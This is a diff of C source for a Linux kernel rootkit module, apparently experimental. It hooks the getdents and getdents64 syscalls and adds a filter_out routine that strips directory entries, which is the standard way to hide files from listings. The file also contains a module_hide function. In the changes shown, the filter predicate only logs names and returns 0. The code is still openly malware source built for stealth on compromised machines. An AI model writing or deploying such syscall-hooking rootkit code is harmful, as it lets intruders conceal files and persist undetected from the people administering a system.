@@ -25,12 +25,21 @@ struct linux_dirent {
 	*/
 };
 
+void filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent));
+int filter_fn(struct linux_dirent d);
+
 asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*real_getdents64)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+	int length;
 	pr_info("ROOTKIT hooked call to new_getdents");
-	return real_getdents(fd, dirp, count);
+	length = real_getdents(fd, dirp, count);
+	
+	if (length == -1 || length == 0) return length;
+	
+	filter_out(dirp, length, &filter_fn);
+	return length;
 }
 
 asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
@@ -40,6 +49,7 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsign
 	
 	if (length == -1 || length == 0) return length;
 	
+	filter_out(dirp, length, &filter_fn);
 	return length;
 }
 
@@ -66,6 +76,8 @@ void filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_
 
 int filter_fn(struct linux_dirent d) {
 	pr_info("%s", d.d_name);
+	
+	return 0;
 }
 
 void module_hide(void) {
